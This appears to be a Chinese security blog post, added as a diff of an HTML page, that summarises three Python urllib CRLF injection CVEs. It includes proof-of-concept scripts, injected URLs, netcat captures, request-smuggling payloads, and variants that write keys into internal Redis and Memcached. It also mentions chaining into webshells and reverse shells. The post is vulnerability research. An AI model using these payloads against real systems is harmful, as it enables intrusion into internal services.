@@ -1,0 +1,385 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,Python,CRLF注入,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>Python urllib CRLF注入漏洞小结 [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        Python urllib CRLF注入漏洞小结
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2020-03-09T15:05:41.000Z">
+        2020-03-09
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CRLF注入/">CRLF注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
+
+    <div class="post-content">
+      <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Python urllib CRLF注入漏洞是很早的东西了，但是19年又新爆出两个CVE，这里就比较下这几个CVE利用注意点及区别吧。</p>
+<h2 id="0x01-CRLF注入漏洞"><a href="#0x01-CRLF注入漏洞" class="headerlink" title="0x01 CRLF注入漏洞"></a>0x01 CRLF注入漏洞</h2><p>CRLF是“回车 + 换行”（\r\n）的简称，十六进制，码为0x0d和0x0a。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。因此，当我们能够控制HTTP消息头中的字符，注入一些恶意的换行比如一些会话Cookie或者HTML代码，这就是CRLF注入。</p>
+<p>具体的可看到wooyun之前的文章：<a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html</a></p>
+<h2 id="0x02-CVE-2016-5699"><a href="#0x02-CVE-2016-5699" class="headerlink" title="0x02 CVE-2016-5699"></a>0x02 CVE-2016-5699</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>urllib2 and urllib in CPython (aka Python) before 2.7.10 and 3.x before 3.4.4</p>
+<h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><p>正常访问URL：</p>
+<p><code>http://10.10.10.10:8080</code></p>
+<p>CRLF注入，注入点在IP地址和端口号的分隔符即<code>:</code>前面：</p>
+<p><code>http://10.10.10.10\r\nx-injected: header\r\ntest:8080</code></p>
+<h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p>这部分直接引自参考的文章。</p>
+<p>HTTP协议解析host的时候可以接受百分号编码的值，解码，然后包含在HTTP数据流里面，但是没有进一步的验证或者编码，这就可以注入一个换行符。</p>
+<p>漏洞验证代码如下，fetch3.py：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    info = urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line"><span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure>
+<p>本地开启nc监听端口：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 12345</span><br></pre></td></tr></table></figure>
+<p>接着，正常运行访问：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fetch3.py http://127.0.0.1:12345/foo</span><br></pre></td></tr></table></figure>
+<p>在nc中会接收到如下报文：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Connection: close</span><br><span class="line">Host: 127.0.0.1:12345</span><br></pre></td></tr></table></figure>
+<p>现在，我们在IP地址和端口之间的分隔符即<code>:</code>之前进行CRLF注入，尝试注入两个HTTP头字段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fetch3.py http://127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo</span><br></pre></td></tr></table></figure>
+<p>然后在nc中接收到如下报文：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">X-injected: header</span><br><span class="line">x-leftover: :12345</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<p>可以看到，请求是正常发送的，并且在Host头字段处获取主机IP地址时成功进行了CRLF注入，即将X-injected和x-leftover这两个头字段都注入了进去。至此，攻击者就可以注入任意的HTTP头字段了。</p>
+<p>另外，在针对的是域名而非IP地址的场景进行利用的时候有个注意点，就是在域名后进行CRLF注入之前要插入一个空字符如<code>%00</code>，这样才能顺利地进行DNS查询。</p>
+<p>比如下面的CRLF注入会URL解析失败：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost%0d%0ax-bar:%20:12345/foo</span><br></pre></td></tr></table></figure>
+<p>但是下面的URL是可以正常解析并访问到127.0.0.1的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost%00%0d%0ax-bar:%20:12345/foo</span><br></pre></td></tr></table></figure>
+<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>参考这篇文章即可：<a href="https://www.cdxy.me/?p=660" target="_blank" rel="noopener">[CVE-2016-5699] Python HTTP header injection in urllib/urllib2</a></p>
+<h2 id="0x03-CVE-2019-9740"><a href="#0x03-CVE-2019-9740" class="headerlink" title="0x03 CVE-2019-9740"></a>0x03 CVE-2019-9740</h2><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><p>urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3</p>
+<h3 id="特征-1"><a href="#特征-1" class="headerlink" title="特征"></a>特征</h3><p>正常访问URL：</p>
+<p><code>http://10.10.10.10:8080/test/?test=a</code></p>
+<p>CRLF注入，注入点在IP地址和端口号的分隔符即<code>:</code>前面，但是和前者的区别在于注入新的端口：</p>
+<p><code>http://10.10.10.10:1234?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123:8080/test/?test=a</code></p>
+<h3 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h3><p>官网的PoC：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">host = <span class="string">"192.168.10.137:7777?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123"</span></span><br><span class="line">url = <span class="string">"http://"</span> + host + <span class="string">":8080/test/?test=a"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    info = urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line"><span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure>
+<p>在Kali开启nc监听7777端口：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure>
+<p>然后运行PoC脚本后，在Kali端接收到请求，可以看到请求报文中是成功CRLF注入了HTTP头字段的：</p>
+<p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/1.png" alt=""></p>
+<p>接着，我们试下攻击Redis，修改PoC脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">host = <span class="string">"192.168.10.137:6379?\r\nSET hacker mi1k7ea\r\n"</span></span><br><span class="line">url = <span class="string">"http://"</span> + host + <span class="string">":8080/test/?test=a"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    info = urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line"><span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure>
+<p>运行脚本，显示报错：</p>
+<p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/2.png" alt=""></p>
+<p>虽然报错，但是在Kali中的Redis中成功创建了新的键值数据，也就是说成功通过Python urllib CRLF注入实现攻击Redis：</p>
+<p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/3.png" alt=""></p>
+<h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><p>参考这篇文章即可：<a href="https://xz.aliyun.com/t/5123" target="_blank" rel="noopener">CVE-2019-9740 Python urllib CRLF injection vulnerability 浅析</a></p>
+<h2 id="0x04-CVE-2019-9947"><a href="#0x04-CVE-2019-9947" class="headerlink" title="0x04 CVE-2019-9947"></a>0x04 CVE-2019-9947</h2><h3 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h3><p>urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3</p>
+<h3 id="特征-2"><a href="#特征-2" class="headerlink" title="特征"></a>特征</h3><p>正常访问URL：</p>
+<p><code>http://10.10.10.10:8080</code></p>
+<p>CRLF注入，注入点在端口号后面：</p>
+<p><code>http://10.10.10.10:8080/?q=HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n</code></p>
+<p><code>http://10.10.10.10:8080/HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n</code></p>
+<h3 id="PoC-2"><a href="#PoC-2" class="headerlink" title="PoC"></a>PoC</h3><p>官网的PoC：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">urllib.request.urlopen(<span class="string">'http://192.168.10.137:7777/?q=HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n'</span>)</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"><span class="comment">#urllib.request.urlopen('http://192.168.10.137:7777/HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n')</span></span><br></pre></td></tr></table></figure>
+<p>在Kali开启nc监听7777端口：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure>
+<p>然后运行PoC脚本后，在Kali端接收到请求，可以看到两种形式的请求报文中都是成功CRLF注入了HTTP头字段的：</p>
+<p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/4.png" alt=""></p>
+<p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/5.png" alt=""></p>
+<p>接着修改下PoC脚本来打内网Redis：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">urllib.request.urlopen(<span class="string">'http://192.168.10.137:6379/?q=HTTP/1.1\r\nSET VULN POC\r\nHeader2:\r\n'</span>)</span><br></pre></td></tr></table></figure>
+<p>运行之后虽然报错，但在Kali的Redis中成功创建了新的键值数据，也就是说成功通过Python urllib CRLF注入实现攻击Redis：</p>
+<p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/6.png" alt=""></p>
+<h2 id="0x05-漏洞组合拳"><a href="#0x05-漏洞组合拳" class="headerlink" title="0x05 漏洞组合拳"></a>0x05 漏洞组合拳</h2><h3 id="Http-Request-Smuggling"><a href="#Http-Request-Smuggling" class="headerlink" title="Http Request Smuggling"></a>Http Request Smuggling</h3><p>HRS即HTTP请求走私，在2005年的时候已被提出，只是最近圈内比较重视敏感信息泄露这块才被重新关注，可参考：</p>
+<p>比如原始请求如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<p>根据HRS，攻击者可以追加注入一个完整的HTTP请求头：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1%0d%0aConnection%3a%20Keep-Alive%0d%0a%0d%0aPOST%20%2fbar%20HTTP%2f1.1%0d%0aHost%3a%20127.0.0.1%0d%0aContent-Length%3a%2031%0d%0a%0d%0a%7b%22new%22%3a%22json%22%2c%22content%22%3a%22here%22%7d%0d%0a:12345/foo</span><br></pre></td></tr></table></figure>
+<p>此时请求包内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line">POST /bar HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 31</span><br><span class="line"></span><br><span class="line">&#123;&quot;new&quot;:&quot;json&quot;,&quot;content&quot;:&quot;here&quot;&#125;</span><br><span class="line">:12345</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<p>该请求在Apache HTTPD下是能成功利用的，但在其他的Web容器中就不一定能正确地解析利用了，这是需要前端服务和后端服务解析的二义性才能导致HRS攻击成功。</p>
+<p>这种攻击可以用在内网攻击上，比如无认证的Rest接口等。</p>
+<h3 id="Redis未授权访问漏洞"><a href="#Redis未授权访问漏洞" class="headerlink" title="Redis未授权访问漏洞"></a>Redis未授权访问漏洞</h3><p>如果Redis在本地未设置密码验证即存在未授权访问漏洞，那么攻击者可以组合Python urllib CRLF注入漏洞来攻击利用Redis未授权访问漏洞，通过其备份文件的功能实现写WebShell、SSH公钥和定时任务反弹shell等等。</p>
+<p>参考：<a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="noopener">Hack Redis via Python urllib HTTP Header Injection</a></p>
+<h3 id="Memcached未授权访问漏洞"><a href="#Memcached未授权访问漏洞" class="headerlink" title="Memcached未授权访问漏洞"></a>Memcached未授权访问漏洞</h3><p>Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，即使没有对外开放端口，但攻击者还是可以组合Python urllib CRLF注入漏洞来通过命令交互来直接读入Memcached中的敏感信息。</p>
+<p>如果我们可以控制内网的Python访问一个URL，然后我们就可以轻松的访问memcached了，比如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1%0d%0aset%20foo%200%200%205%0d%0aABCDE%0d%0a:11211/foo</span><br></pre></td></tr></table></figure>
+<p>就会产生下面的HTTP头</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Connection: close</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">set foo 0 0 5</span><br><span class="line">ABCDE</span><br><span class="line">:11211</span><br></pre></td></tr></table></figure>
+<p>当检查下面几行memcached的协议语法的时候，大部分都是语法错误，但是memcached在收到错误的命令的时候并不会关闭连接，这样攻击者就可以在请求的任何位置注入命令了，然后memcached就会执行。下面是memcached的响应（memcached是Debian下包管理默认配置安装的）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ERROR</span><br><span class="line">ERROR</span><br><span class="line">ERROR</span><br><span class="line">ERROR</span><br><span class="line">ERROR</span><br><span class="line">STORED</span><br><span class="line">ERROR</span><br><span class="line">ERROR</span><br></pre></td></tr></table></figure>
+<p>经过确认，memcached中确实成功的插入了<code>foo</code>的值。这种场景下，攻击者就可以给内网的memcached实例发送任意命令了。如果应用依赖于memcached中存储的数据（比如用户的session数据，HTML或者其他的敏感数据），攻击者可能获取应用更高的权限了。这个利用方式还可以造成拒绝服务攻击，就是攻击者可以在memcached中存储大量的数据。</p>
+<h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://xz.aliyun.com/t/5123" target="_blank" rel="noopener">CVE-2019-9740 Python urllib CRLF injection vulnerability 浅析</a></p>
+<p><a href="http://pages.strcpy.me/index.php/archives/749/" target="_blank" rel="noopener">Python urllib HTTP头注入漏洞</a></p>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-CRLF注入漏洞"><span class="toc-text">0x01 CRLF注入漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-CVE-2016-5699"><span class="toc-text">0x02 CVE-2016-5699</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#影响版本"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#特征"><span class="toc-text">特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PoC"><span class="toc-text">PoC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#源码分析"><span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-CVE-2019-9740"><span class="toc-text">0x03 CVE-2019-9740</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#影响版本-1"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#特征-1"><span class="toc-text">特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PoC-1"><span class="toc-text">PoC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#源码分析-1"><span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-CVE-2019-9947"><span class="toc-text">0x04 CVE-2019-9947</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#影响版本-2"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#特征-2"><span class="toc-text">特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PoC-2"><span class="toc-text">PoC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-漏洞组合拳"><span class="toc-text">0x05 漏洞组合拳</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Http-Request-Smuggling"><span class="toc-text">Http Request Smuggling</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis未授权访问漏洞"><span class="toc-text">Redis未授权访问漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Memcached未授权访问漏洞"><span class="toc-text">Memcached未授权访问漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-参考"><span class="toc-text">0x06 参考</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2020/03/08/内网信息收集之域相关信息收集/" rel="next" title="内网信息收集之域相关信息收集一">
+          内网信息收集之域相关信息收集一
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2020/03/11/浅析HRS漏洞/" rel="prev" title="浅析HRS漏洞">
+            浅析HRS漏洞
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
